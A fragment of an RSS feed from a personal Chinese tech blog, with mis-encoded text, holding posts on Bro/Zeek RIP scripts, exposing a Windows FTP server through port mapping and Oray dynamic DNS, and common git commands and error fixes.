In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
In rip_response
&lt;/code>&lt;/pre>
&lt;h2 id="æåçè§£">æåçè§£&lt;/h2>
&lt;p>å¨åé¢çé¨åï¼å¹¶æ²¡æå»å¤ç&lt;code>scripts/base/protocols/rip/&lt;/code>ç®å½ä¸é¢çæä»¶ï¼æ¥ä¸æ¥æä»¬éè¦æ¥çè§£è¿å ä¸ªæä»¶ã&lt;/p>
&lt;pre>&lt;code class="language-bash">Guoze@node-0:~/00_Workbench/bro/scripts/base/protocols/rip$ ls -l
total 12
-rw-r--r-- 1 Guoze senfv-PG0 245 May 23 12:49 dpd.sig
-rw-r--r-- 1 Guoze senfv-PG0 66 May 23 12:49 __load__.bro
-rw-r--r-- 1 Guoze senfv-PG0 1327 May 23 12:49 main.bro
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>&lt;strong>load&lt;/strong>.bro: This allows all the contents of the directory to be loaded via @load base/protocols/sip.
dpd.sig: This file contains a signature that can be used to attach the analyzer to connections if their content matches.
main.bro: Contains the base script-layer functionality for processing events emitted from the analyzer.&lt;/p>
&lt;/blockquote>
&lt;h3 id="__load__broçè§£">&lt;strong>load&lt;/strong>.broçè§£&lt;/h3>
&lt;p>è¿ä¸ªæä»¶å è½½äºææçåå®¹å°Broä¸­å»ã&lt;/p>
&lt;h3 id="dpdsig-digital-protocol-detection-scripts">dpd.sig (digital protocol detection scripts)&lt;/h3>
&lt;p>å½ä½ æ¾åºæ¥å¹éä½ å®ä¹çç¹æ®çåè®®çæ¶åï¼ä»å°±ä¼çæåè°ç¨å¯¹åºçåæå¨å»å¤çï¼æä»¬å¯ä»¥è¿éå®ä¹å®éè¦å¤ççæ¥å£&lt;/p>
&lt;h3 id="mainbro">main.bro&lt;/h3>
&lt;p>è¿ä¸ªæä»¶åå«äºææçåºæ¬å·¥ä½åææåæå¨åå®¹ï¼Broé¦åäºå¿çåå®¹&lt;/p>
&lt;p>&amp;lt;æªå®å¾ç»­&amp;gt;&lt;/p></description></item><item><title>è±çå£³ä½ä¸ºååè§£ææ¥æ­å»ºFTPæå¡å¨</title><link>http://www.guozet.me/post/FTP-server-by-oray/</link><pubDate>Sun, 20 May 2018 01:30:32 +0000</pubDate><guid>http://www.guozet.me/post/FTP-server-by-oray/</guid><description>&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;p>å¨å®éç½ç»ç¯å¢ä¸­å¾å¤æ¶åæä»¬éè¦å¨å±åç½åä¸¤å°çµèä¹é´ï¼å¤ç½ä¸å±åç½åé¨ççµèä¹é´å®æå¤§æä»¶çä¼ è¾ï¼å¨è¿éå°±ä¼åºç°ä¸ä¸ªå°é®é¢ï¼å¸¸è§çå°æä»¶æä»¬åªéè¦ä½¿ç¨QQæèSkypeè¿ä¸ç±»çå³æ¶èå¤©è½¯ä»¶å°±å¯ä»¥åå°ï¼ä½æ¯å½æä»¬çæä»¶æå åä¸ªGé£ä¹å¤§çæ¶åï¼å±åç½åä¸å¤ç½ä¹é´è¿è¡å¤§æä»¶ä¼ è¾å°±æ²¡æé£ä¹æ¹ä¾¿äºã&lt;/p>
&lt;h1 id="èæ¯">èæ¯&lt;/h1>
&lt;p>æçä¸»æºï¼Windows 10 æè°ç(è·¯ç±å¨ä¸é¢çå±åç½å)&lt;br>
å¯¹æ¹ä¸»æºï¼Mac(ä¸ä¸æçä¸»æºå¨ä¸ä¸ªå±åç½å)&lt;br>
è¦æ±: éè¦å°å¤§çº¦30Gç10ä¸ªè§é¢æä»¶ä¼ éå°å¯¹æ¹ä¸»æºä¸é¢&lt;/p>
&lt;h1 id="è§£å³æ¹å¼">è§£å³æ¹å¼&lt;/h1>
&lt;p>ç±äºè§é¢æä»¶åä¸ªæä»¶è¶è¿ç2G,ä½¿ç¨å¸¸è§çå³æ¶éä¿¡è½¯ä»¶ï¼æ æ³æ»¡è¶³æçéæ±ãèèå°èªå·±å¯¹FTPä¼ è¾æ¯è¾çæï¼éæ©æ­å»ºFTPæå¡å¨æ¥è¿è¡ä¼ è¾ãè¿éæä»¥ä¸å ä¸ªæ­¥éª¤ï¼&lt;/p>
&lt;ul>
&lt;li>æçä¸»æºä¸é¢æ­å»ºFTPæå¡å¨ï¼å¹¶æ¬å°æµè¯éè¿&lt;/li>
&lt;li>éæ©è·¯ç±å¨FTPæå¡è¯·æ±ç«¯å£æ å°ï¼ä¼ éå¤ç½çFTPè¯·æ±å°æçä¸»æºä¸&lt;/li>
&lt;li>èèå°æ¹ä¾¿è¾å¥FTPæå¡å¨ç½åï¼å·²ç»é²æ­¢ç½ç»è¿è¥åå¨æåéå¬ç½IPå°åå°è·¯ç±å¨ä¸ï¼éæ©ä½¿ç¨äºè±çå£³æ¥ä½ä¸ºä¸ä¸ªååè§£æå¨&lt;/li>
&lt;/ul>
&lt;h2 id="åæå·¥ä½">åæå·¥ä½&lt;/h2>
&lt;h3 id="åè¾¨èªå·±è·¯ç±å¨ipæ¯çå®çå¬ç½ip">åè¾¨èªå·±è·¯ç±å¨IPæ¯çå®çå¬ç½IP&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>ç¹å»è¯¥
&lt;a href="http://www.net.cn/static/customercare/yourIP.asp" target="_blank" rel="noopener">&lt;strong>é¾æ¥&lt;/strong>&lt;/a> å¾å°èªå·±å½åçIPå°åã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ç¯å¢ï¼Windows10âæå¼ä¸ä¸ªå½ä»¤æç¤ºçªå£&lt;br>
&lt;code>tracert 108.216.***.***(è¾å¥åæå¾å°çIPå°å)&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦æåªæä¸è·³é£å°±è¯´æä½ çè·¯ç±å¨ä¸é¢æ¯æå¬ç½IPå°åçï¼å¦æè¶è¿ä¸è·³é£å°±è¯å®æ¯åç½IPå°åäºã&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>å¦ææ¬å°ä¸»æºçä¸å±è·¯ç±å¨æ¯æå¬ç½IPå°å(åé¢ç»å¤ç½çç¨æ·ä½¿ç¨çæ¥è®¿é®ä½ åç½FTPæå¡å¨çIPå°å)çï¼é£å°±å¯ä»¥è¿è¡ä¸ä¸æ­¥æä½äºã&lt;/p>
&lt;h2 id="æ¬å°æ­å»ºftpæå¡å¨">æ¬å°æ­å»ºFTPæå¡å¨&lt;/h2>
&lt;p>å¨Windowsä¸é¢æ¥æ­å»ºFTPæå¡å¨æ¯æ¯è¾ç®åçï¼å¹¶ä¸éè¦ä½ åå»ä¸è½½ä¸äºå¶ä»çå·¥å·è½¯ä»¶äºï¼å¾®è½¯å·²ç»æä¾äºFTPæå¡å¨ç³»ç»ä¸­ï¼ä½ åªéè¦åçå°±æ¯æå¼å¯¹åºçæå¡ï¼å»ºç«èªå·±çç½ç«å°±å¥½äºï¼ä¸»è¦æ­¥éª¤ï¼&lt;/p>
&lt;ol>
&lt;li>æå¼Windows10éé¢çFTPæå¡åè½&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-16-46-36.png" alt="">&lt;/p>
&lt;ol start="2">
&lt;li>åå»ºFTPæå¡å¨&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-16-47-01.png" alt="">&lt;/p>
&lt;ol start="3">
&lt;li>æ¬å°æµè¯FTPæå¡å¨æ¯å¦å·¥ä½&lt;/li>
&lt;/ol>
&lt;h3 id="å¯å¨ftpåiisæå¡åè½">å¯å¨ftpåiisæå¡åè½&lt;/h3>
&lt;p>æ§å¶é¢æ¿-&amp;gt;ç¨åºååè½-&amp;gt;æå¼æå³é­windowsåè½&lt;br>
å¨åè½æå¡ä¸­æ¾å°Internetä¿¡æ¯æå¡ä¸é¢çFTPæå¡å¨åWebç®¡çå·¥å·ï¼å°è¿ä¸¤ä¸ªå¨é¨å¾é&lt;/p>
&lt;h3 id="æ·»å ftpç«ç¹">æ·»å FTPç«ç¹&lt;/h3>
&lt;p>æ§å¶é¢æ¿-&amp;gt;ç³»ç»åå®å¨-&amp;gt;ç®¡çå·¥å·-&amp;gt;(å·¦é¢èåä¸­)æå¡&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-17-15-41.png" alt="">&lt;/p>
&lt;p>ä¹åéæ©ä¸ä¸ªæ¬å°è·¯å¾æ¥ä½ä¸ºFTPçæ ¹æå¡&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-17-15-55.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-17-16-06.png" alt="">&lt;/p>
&lt;p>ç»å®IPå°åï¼è¿éç»å®çIPå°åå°±æ¯èªå·±çåç½è·¯ç±å¨åéç»ä½ çå°åï¼å¯ä»¥éè¿CMDç&lt;code>ipconfig&lt;/code>è¿è¡æ¥è¯¢ï¼æ¥å°èªå·±å½åä½¿ç¨çç½ç»ééå¨ä¸é¢çå±åç½åéçIPå°åæ¯å¤å°ã&lt;/p>
&lt;p>æä»¥æä»¬å°±å¯ä»¥æè¿ä¸ªåç½çIPå°åç»å®ä¸å»&lt;code>192.168.1.149&lt;/code>ï¼ç¶åæå®ç¨æ·åç¨æ·ç»å¯ä»¥è®¿é®è¯¥FTPæå¡å¨æä»»æäººåå¯è®¿é®ãç±äºå¨è¿éï¼æåªæ¯ç¨è¿ä¸ªæ¥ç­æ¶é´ä¼ éä¸äºè§é¢çå¤§æä»¶ï¼æä»¥æéæ©çæ¯ææç¨æ·åå¯ä»¥è®¿é®ã&lt;br>
å°è¿éå·®ä¸å¤å°±è®¾ç½®å®æäºï¼å¯ä»¥æå¼ç½é¡µè¾å¥&lt;code>ftp://192.168.1.149&lt;/code>è¿è¡æµè¯ï¼å¦æè½å¤æ¾ç¤ºåºæ¥èªå·±è®¾ç½®çæ ¹æä»¶ä¸é¢çæä»¶åå®¹ï¼é£è¡¨ç¤ºæµè¯æåï¼FTPæå¡å¨å·²ç»æ­å»ºå®æã&lt;/p>
&lt;blockquote>
&lt;p>FTPæå¡å¨è¿æ¶åå°ä¸äºæéè®¾ç½®æ¹é¢çå·¥ä½ï¼å¯åèåå®¢ï¼&lt;br>
&lt;a href="https://www.jianshu.com/p/766ec3356524" target="_blank" rel="noopener">windows æ­å»ºftpæå¡å¨ä¸æéæ§å¶&lt;/a>&lt;br>
&lt;a href="https://blog.csdn.net/EXLsunshine/article/details/29181465" target="_blank" rel="noopener">Windowsä¸æ­å»ºFTPæå¡å¨&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;h2 id="è·¯ç±å¨ç«¯å£æ å°">è·¯ç±å¨ç«¯å£æ å°&lt;/h2>
&lt;p>ä¸è¿°æ­å»ºçFTPæå¡å¨ä»ä»è½å¤å¨æ¬å°åå±åç½åé¨ä½¿ç¨ï¼å ä¸ºå¤ç½æ¯æ²¡æåæ³è®¿é®å°ä½ è¿ä¸ªåç½çç½ç»IPå°åçï¼è·¯ç±å¨ç«¯å£æ å°ï¼è·¯ç±æ å°FTPæå¡è®¿é®ç«¯å£ãå ä¸ºå¬ç½IPæ¯å¨è·¯ç±å¨ä¸çï¼å¤ç½è®¿é®æ¶ï¼éè¦ç»è¿è·¯ç±ï¼éè¦å¨è·¯ç±å¨ä¸åç«¯å£æ å°ï¼å°åç½FTPæå¡è®¿é®ç«¯å£æéã&lt;/p>
&lt;h3 id="ç«¯å£æ å°ä¸¤ç§æ¹å¼">ç«¯å£æ å°(ä¸¤ç§æ¹å¼)&lt;/h3>
&lt;h4 id="1ä½¿ç¨dmzæå¡">1.ä½¿ç¨DMZæå¡&lt;/h4>
&lt;p>TP-LINKè·¯ç±å¨ç«¯å£æ å°ä½ç½®ï¼è½¬åè§å/DMZä¸»æº/å¯ç¨DMZå¹¶æ·»å åè®¸å¤ç½è®¿é®åç½FTPæå¡å¨ãæçFTPæå¡å¨åç½å°åæ¯192.168.1.49.&lt;br>
ä½¿ç¨DMZæå¡æä¸ä¸ªç¼ºé·ï¼è¿å°±ç¸å½äºææä»¬çæ¬å°ä¸»æºçææç«¯å£é½æ´é²å¨ç½ç»ä¸çï¼è¿å¹¶ä¸æ¯æä»¬æ¯è¾æ³è¦çå¤çæ¹å¼ã&lt;/p>
&lt;h4 id="2ä½¿ç¨èææå¡å¨æ¥å®æç«¯å£æ å°">2.ä½¿ç¨èææå¡å¨æ¥å®æç«¯å£æ å°&lt;/h4>
&lt;p>TP-LInkè·¯ç±å¨ç¹å»è½¬åè§åââèææå¡å¨ï¼åå¥½ç«¯å£æ å°ï¼å¦å¾(è¿éæä½¿ç¨çæ¯ç½ç»å¾çï¼æä»¬åºè¯¥ä½¿ç¨çIPå°åæ¯èªå·±æ¬å°çå±åç½åå°å)ï¼&lt;br>
&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-16-48-49.png" alt="">&lt;/p>
&lt;p>ç«¯å£æ å°ä¸­ï¼IPå°åå°±æ¯æå¡å¨åç½IPæ¯192.168.1.149.ç«¯å£å·å°±æ¯21ï¼è¦ä¸FTPæå¡ä½¿ç¨ç«¯å£å·ï¼21ï¼ä¿æä¸è´ãåè®®éæ©ALLå³å¯ï¼å¾éå¯ç¨ï¼ç¶åä¿å­å³å¯ã&lt;br>
å°è¿éï¼æä»¬å°±å¯ä»¥å°è¯å¨å¤ç½è®¿é®æä»¬çFTPæå¡å¨äºï¼è®¿é®å°åï¼&lt;br>
&lt;code>ftp://ä½ çè·¯ç±å¨å¬ç½å°å&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>å½ä½¿ç¨=å¬ç½IPæ æ³è®¿é®ï¼åç½IPå¯ä»¥è®¿é®çæ¶åï¼ä¸è¬æ¯ææ¯è½¯ä»¶æèé²ç«å¢é®é¢ï¼ä»¥windows 10 ä¸ºä¾ï¼å¨ç½ç»è¿æ¥-å±æ§-é«çº§-é²ç«å¢è®¾ç½®ï¼å³é­é²ç«å¢ãå¦æä¾æ§ä¸è¡ï¼è¯·å³é­ææ¯è½¯ä»¶åè¿è¡å°è¯ã&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;h2 id="ä½¿ç¨è±çå£³è¿è¡ååè§£æ">ä½¿ç¨è±çå£³è¿è¡ååè§£æ&lt;/h2>
&lt;p>ä½¿ç¨FTPæå¡å¨ï¼å¨å®éä½¿ç¨ä¸­ï¼æä»¬çè·¯ç±å¨å¬ç½IPå°åå¯è½åçååï¼åå æ¯ï¼æ¯æ¬¡éå¯è·¯ç±å¨ï¼æä»¬çç½ç»ä¾åºåå¯è½éæ°åéå¬ç½IPå°è¿ä¸ªè·¯ç±å¨ä¸é¢ï¼è¿å°±ä¼é ææä»¬çFTPæå¡å¨ä¸è½è®¿é®ã&lt;/p>
&lt;p>è§£å³æ¹æ¡ï¼éæ©è±çå£³è½¯ä»¶å®æååçå¨æè§£æï¼åååºå®ï¼å³ä½¿æä»¬çè·¯ç±å¨å¬ç½å°åååï¼åªè¦ä½ å¨æ¬å°è¿è¡çè±çå£³è½¯ä»¶å®¢æ·ç«¯ï¼å°±å¯ä»¥å®æ¶ç»å®ææ°çå°åå°æä»¬çååå°åã(æä¸»è¦çåå ï¼è¿ä¸ªè½¯ä»¶æ¯åè´¹ç)&lt;/p>
&lt;h3 id="ä¸è½½å¹¶å®è£è±çå£³å®¢æ·ç«¯">ä¸è½½å¹¶å®è£è±çå£³å®¢æ·ç«¯&lt;/h3>
&lt;h4 id="1ä¸è½½å¹¶å®è£">1.ä¸è½½å¹¶å®è£&lt;/h4>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-16-47-36.png" alt="">&lt;/p>
&lt;h4 id="2ç»éå®¢æ·ç«¯éè¦åæ³¨åä¸ä¸ªè´¦å·æè½å¾å°ä¸ä¸ªåè´¹çåå">2.ç»éå®¢æ·ç«¯(éè¦åæ³¨åä¸ä¸ªè´¦å·ï¼æè½å¾å°ä¸ä¸ªåè´¹çåå)&lt;/h4>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-16-48-20.png" alt="">&lt;/p>
&lt;h4 id="3ç¡®å®æ¯å¦ç»å®äºåå">3.ç¡®å®æ¯å¦ç»å®äºåå&lt;/h4>
&lt;p>ä½¿ç¨æ¨å¨è±çå£³å®ç½æ³¨åçå¸å·ååå¯ç å¡«å¥è±çå£³å®¢æ·ç«¯è½¯ä»¶ä¸­è¿è¡ç»éï¼ç»å½Orayå¸å·ä¹åï¼å¨ä¸»çé¢ä¸é¢ç¹å»åååè¡¨ï¼è¿å¥å°åååè¡¨çç®¡ççé¢ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-16-48-35.png" alt="">&lt;/p>
&lt;p>ç¹å»ååè¯æ­ï¼ç¡®å®å¨æååè§£æç»æï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-05-20-FTP-server-by-oray/2018-09-23-16-49-42.png" alt="">&lt;/p>
&lt;p>å¦æå¾å°çååç»æå°±æ¯èªå·±è·¯ç±å¨çå¬ç½å°åï¼é£ä¹å¤ç½ççµèå°±å¯ä»¥éè¿è¿ä¸ªååæ¥è®¿é®ä½ çFTPæå¡å¨äºï¼å³ä½¿ä½ çä¸»æºå¤å¨å±åç½åã&lt;/p>
&lt;blockquote>
&lt;p>å¯æ¥çè±çå£³è½¯ä»¶çå®ç½è¯´æææ¡£ï¼ä½æ¯ä¸æ¨èä½¿ç¨å®æå°çFTPæå¡å¨è½¯ä»¶(è½å¤ç´æ¥ä½¿ç¨å¾®è½¯çæå¡ï¼ä¸ºä½è¿ç¨ä¸è½½è½¯ä»¶å®è£å°èªå·±ççµèä¸é¢å¢)&lt;br>
&lt;a href="http://service.oray.com/question/752.html" target="_blank" rel="noopener">ä½¿ç¨è±çå£³æå¡æ­å»ºFTPæå¡å¨&lt;/a>&lt;/p>
&lt;/blockquote></description></item><item><title>Gitä¸ååºæ¯å¸¸ç¨å½ä»¤</title><link>http://www.guozet.me/post/Some-git-common-commands-in-life/</link><pubDate>Sat, 12 May 2018 16:14:31 +0000</pubDate><guid>http://www.guozet.me/post/Some-git-common-commands-in-life/</guid><description>&lt;h1 id="gitå­æ¨¡åä»åºä¸­åå«å¦å¤ä¸ä¸ªä»åº">Gitå­æ¨¡å:ä»åºä¸­åå«å¦å¤ä¸ä¸ªä»åº&lt;/h1>
&lt;h2 id="åºæ¯">åºæ¯&lt;/h2>
&lt;p>å¨å·¥ä½çé¡¹ç®ä¸­éè¦åå«å¦å¤çé¡¹ç®ï¼è¿ä¸ªæ¶åæä»¬å°±éè¦å¼åºå¶ä»çé¡¹ç®ï¼ä½æ¯æä»¬å¸æå¨å¼å¥çé¡¹ç®ååçæ¶åï¼æä»¬ä¹å¯ä»¥å¾å¿«çåå¹¶å°æä»¬ç°æçåæ¯ä¸­ã&lt;/p>
&lt;h2 id="æä½æä»¤">æä½æä»¤&lt;/h2>
&lt;h3 id="ç°ærepoå å¥å­repo">ç°ærepoå å¥å­repo&lt;/h3>
&lt;p>å¨ä½ æ³è¦æ·»å çç®å½ä½ç½®è¾å¥æ·»å å­repoçå½ä»¤å³å¯&lt;/p>
&lt;pre>&lt;code class="language-bash">git submodule add https://github.com/guozetang/paper_code_tracker
&lt;/code>&lt;/pre>
&lt;p>æ¥çç¶æåæ°ï¼
&lt;code>git status&lt;/code>&lt;/p>
&lt;p>å¨repo(ä¸æ¯å­repo)çæ ¹ç®å½æ¥çå½åå å¥çå­æ¨¡å(å­repo)ã&lt;/p>
&lt;pre>&lt;code class="language-bash">$ cat .gitmodules
[submodule &amp;quot;python/paper_code_tracker&amp;quot;]
path = python/paper_code_tracker
url = https://github.com/guozetang/paper_code_tracker
&lt;/code>&lt;/pre>
&lt;h3 id="æäº¤æ·»å çå­æ¨¡å">æäº¤æ·»å çå­æ¨¡å&lt;/h3>
&lt;pre>&lt;code class="language-bash">$ git commit -am &amp;quot;added subproject module&amp;quot;
[master (root-commit) 9168027] added subproject module
2 files changed, 7 insertions(+)
create mode 100644 .gitmodules
create mode 160000 python/paper_code_tracker
&lt;/code>&lt;/pre>
&lt;p>å¶ä»æ´å¤æä½è¯·åè:
&lt;a href="https://www.jianshu.com/p/491609b1c426" target="_blank" rel="noopener">ãGitãå­æ¨¡åï¼ä¸ä¸ªä»åºåå«å¦ä¸ä¸ªä»åº&lt;/a>&lt;/p>
&lt;h1 id="åæ¯æä½">åæ¯æä½&lt;/h1>
&lt;h2 id="åºæ¯-1">åºæ¯&lt;/h2>
&lt;p>å¼åè¿ç¨ä¸­ç»å¸¸ç¨å°ä»masteråæ¯copyä¸ä¸ªå¼ååæ¯,è¿è¡å¼å&lt;/p>
&lt;h2 id="æä½æä»¤ä»ç»">æä½æä»¤ä»ç»&lt;/h2>
&lt;pre>&lt;code class="language-sh">$git checkout master //åæ¢å°è¢«copyçåæ¯ï¼masterï¼
$git pull //ä»è¿ç«¯æåææ°çæ¬
$git checkout -b NewBranch //Switched to a new branch 'dev'
$git push origin NewBranch //æ°å»ºåæ¯pushå°è¿ç«¯
&lt;/code>&lt;/pre>
&lt;h2 id="éå°çé®é¢">éå°çé®é¢&lt;/h2>
&lt;pre>&lt;code class="language-sh">$git pull
There is no tracking information for the current branch.
Please specify which branch you want to merge with.
See git-pull(1) for details.
git pull &amp;lt;remote&amp;gt; &amp;lt;branch&amp;gt;
If you wish to set tracking information for this branch you can do so with:
git branch --set-upstream-to=origin/&amp;lt;branch&amp;gt; NewBranch
&lt;/code>&lt;/pre>
&lt;p>ç»è¿éªè¯ï¼å½åçåæ¯å¹¶æ²¡æåæ¬å°åæ¯å³èï¼æ ¹æ®æç¤ºè¿è¡ä¸ä¸æ­¥ï¼&lt;/p>
&lt;p>&lt;strong>å³è&lt;/strong>&lt;/p>
&lt;p>&lt;code>$git branch --set-upstream-to=origin/NewBranch&lt;/code>&lt;/p>
&lt;p>æ³¨æï¼è¿ébranchä¹åé½æ¯æ²¡æç©ºæ ¼çï¼å¦ææç©ºæ ¼åæ¯éè¯¯å½ä»¤&lt;/p>
&lt;p>&lt;strong>åæ¬¡æå&lt;/strong>&lt;/p>
&lt;p>&lt;code>$git pull&lt;/code>&lt;/p>
&lt;hr>
&lt;h1 id="å³èè¿ç¨repo">å³èè¿ç¨repo&lt;/h1>
&lt;h2 id="åºæ¯-2">åºæ¯&lt;/h2>
&lt;p>æä»¬ç»å¸¸ç±äºä¸èµ·ä¸ç¥éçé®é¢ï¼é ææä»¬éè¦å é¤&lt;code>.git&lt;/code>æä»¶å¤¹ä¹åï¼ä½¿ç¨&lt;code>git init&lt;/code>æ¥æ°å»ºä¸ä¸ªæä»¶å¤¹ï¼è¿æ¶åå°±éè¦æä»¬å°æ°å»ºçrepoå³èå°è¿ç¨çrepoä¸å»ã&lt;/p>
&lt;h2 id="æä½å½ä»¤ä»ç»">æä½å½ä»¤ä»ç»&lt;/h2>
&lt;h3 id="å¨æ¬å°ç®å½ä¸å³èè¿ç¨repository">å¨æ¬å°ç®å½ä¸å³èè¿ç¨repository&lt;/h3>
&lt;pre>&lt;code class="language-bash">git remote add origin git@github.com:git_username/repository_name.git
&lt;/code>&lt;/pre>
&lt;h3 id="åæ¶æ¬å°ç®å½ä¸å³èçè¿ç¨åº">åæ¶æ¬å°ç®å½ä¸å³èçè¿ç¨åºï¼&lt;/h3>
&lt;pre>&lt;code class="language-bash">git remote remove origin
&lt;/code>&lt;/pre>
&lt;h1 id="æä»¶æä½">æä»¶æä½&lt;/h1>
&lt;h2 id="åºæ¯-3">åºæ¯&lt;/h2>
&lt;p>å¦æä¸ä¸ªæä»¶ä¸å°å¿è¢«å é¤äºï¼å¯ä»¥æä¸¤ç§æ¹æ³æ¢å¤ã&lt;/p>
&lt;h2 id="æä½å½ä»¤ä»ç»-1">æä½å½ä»¤ä»ç»&lt;/h2>
&lt;p>1ãéè¦è®°ä½æéæ¢å¤æä»¶çåå­åçæ¬å·(commit id)&lt;/p>
&lt;pre>&lt;code class="language-bash">git checkout commit_id -- file_name
&lt;/code>&lt;/pre>
&lt;h3 id="fatal-remote-origin-already-exists">fatal: remote origin already exists.&lt;/h3>
&lt;p>å¦æè¾å¥:&lt;br>
$ git remote add origin
&lt;a href="https://link.jianshu.com?t=mailto:git@github.com:djqiang/gitdemo.git" target="_blank" rel="noopener">git@github.com:djqiangï¼githubå¸å·åï¼/gitdemoï¼é¡¹ç®åï¼.git&lt;/a>&lt;br>
æç¤ºåºéä¿¡æ¯ï¼&lt;strong>fatal: remote origin already exists&lt;/strong>.&lt;br>
è§£å³åæ³å¦ä¸ï¼&lt;/p>
&lt;p>1ãåè¾å¥$ git remote rm origin&lt;/p>
&lt;p>2ãåè¾å¥$ git remote add origin
&lt;a href="https://link.jianshu.com?t=mailto:git@github.com:djqiang/gitdemo.git" target="_blank" rel="noopener">git@github.com:djqiang/gitdemo.git&lt;/a> å°±ä¸ä¼æ¥éäºï¼&lt;/p>
&lt;p>3ãå¦æè¾å¥$ git remote rm origin è¿æ¯æ¥éçè¯ï¼error: Could not remove config section &amp;lsquo;remote.origin&amp;rsquo;. æä»¬éè¦ä¿®æ¹gitconfigæä»¶çåå®¹&lt;/p>
&lt;p>4ãæ¾å°ä½ çgithubçå®è£è·¯å¾ï¼æçæ¯&lt;/p>
&lt;p>C:\Users\ASUS\AppData\Local\GitHub\PortableGit_ca477551eeb4aea0e4ae9fcd3358bd96720bb5c8\etc&lt;/p>
&lt;p>5ãæ¾å°ä¸ä¸ªåä¸ºgitconfigçæä»¶ï¼æå¼å®æéé¢ç[remote &amp;ldquo;origin&amp;rdquo;]é£ä¸è¡&lt;br>
å æå°±å¥½äºï¼&lt;/p>
&lt;h3 id="permission-denied-publickey">Permission denied (publickey)&lt;/h3>
&lt;p>å¦æè¾å¥:&lt;br>
$ ssh -T
&lt;a href="https://link.jianshu.com?t=mailto:git@github.com" target="_blank" rel="noopener">git@github.com&lt;/a>&lt;br>
åºç°éè¯¯æç¤ºï¼&lt;strong>Permission denied (publickey)&lt;/strong>.å ä¸ºæ°çæçkeyä¸è½å å¥sshå°±ä¼å¯¼è´è¿æ¥ä¸ä¸githubã&lt;br>
è§£å³åæ³å¦ä¸ï¼&lt;/p>
&lt;p>1ãåè¾å¥$ ssh-agentï¼åè¾å¥$ ssh-add ~/.ssh/id_keyï¼è¿æ ·å°±å¯ä»¥äºã&lt;/p>
&lt;p>2ãå¦æè¿æ¯ä¸è¡çè¯ï¼è¾å¥ssh-add ~/.ssh/id_key å½ä»¤ååºç°æ¥éCould not open a connection to your authentication agent.è§£å³æ¹æ³æ¯keyç¨Git Guiçsshå·¥å·çæï¼è¿æ ·çæçæ¶åkeyå°±ç´æ¥ä¿å­å¨sshä¸­äºï¼ä¸éè¦åssh-addå½ä»¤å å¥äºï¼å¶å®çuserï¼tokenç­éç½®é½ç¨å½ä»¤è¡æ¥åã&lt;/p>
&lt;p>3ãæå¥½æ£æ¥ä¸ä¸å¨ä½ å¤å¶id_rsa.pubæä»¶çåå®¹æ¶ææ²¡æäº§çå¤ä½çç©ºæ ¼æç©ºè¡ï¼æäºç¼è¾å¨ä¼å¸®ä½ æ·»å è¿äºçã&lt;/p>
&lt;h3 id="errorfailed-to-push-som-refs-to-">error:failed to push som refs to &amp;hellip;&amp;hellip;.&lt;/h3>
&lt;p>å¦æè¾å¥:&lt;br>
$ git push origin master&lt;br>
æç¤ºåºéä¿¡æ¯ï¼&lt;strong>error:failed to push som refs to &amp;hellip;&amp;hellip;.&lt;/strong>&lt;br>
è§£å³åæ³å¦ä¸ï¼&lt;/p>
&lt;p>1ãåè¾å¥$ git pull origin master //åæè¿ç¨æå¡å¨githubä¸é¢çæä»¶æä¸æ¥&lt;/p>
&lt;p>2ãåè¾å¥$ git push origin master&lt;/p>
&lt;p>3ãå¦æåºç°æ¥é fatal: Couldn&amp;rsquo;t find remote ref masteræèfatal: &amp;lsquo;origin&amp;rsquo; does not appear to be a git repositoryä»¥åfatal: Could not read from remote repository.&lt;/p>
&lt;p>4ãåéè¦éæ°è¾å¥$ git remote add origin
&lt;a href="https://link.jianshu.com?t=mailto:git@github.com:djqiang/gitdemo.git" target="_blank" rel="noopener">git@github.com:djqiang/gitdemo.git&lt;/a>&lt;/p>
&lt;h3 id="ä½¿ç¨gitå¨æ¬å°åå»ºä¸ä¸ªé¡¹ç®çè¿ç¨">ä½¿ç¨gitå¨æ¬å°åå»ºä¸ä¸ªé¡¹ç®çè¿ç¨&lt;/h3>
&lt;pre>&lt;code>$ makdir ~/hello-world //åå»ºä¸ä¸ªé¡¹ç®hello-world
$ cd ~/hello-world //æå¼è¿ä¸ªé¡¹ç®
$ git init //åå§å
$ touch README
$ git add README //æ´æ°READMEæä»¶
$ git commit -m 'first commit' //æäº¤æ´æ°ï¼å¹¶æ³¨éä¿¡æ¯âfirst commitâ
$ git remote add origin [git@github.com:defnngj/hello-world.git](mailto:git@github.com:defnngj/hello-world.git) //è¿æ¥è¿ç¨githubé¡¹ç®
$ git push -u origin master //å°æ¬å°é¡¹ç®æ´æ°å°githubé¡¹ç®ä¸å»
&lt;/code>&lt;/pre>
&lt;h3 id="permission-deniedpublickey">Permission denied(publickey)&lt;/h3>
&lt;pre>&lt;code class="language-bash">â workspace_config git:(document) git push origin document
Permission denied (publickey).
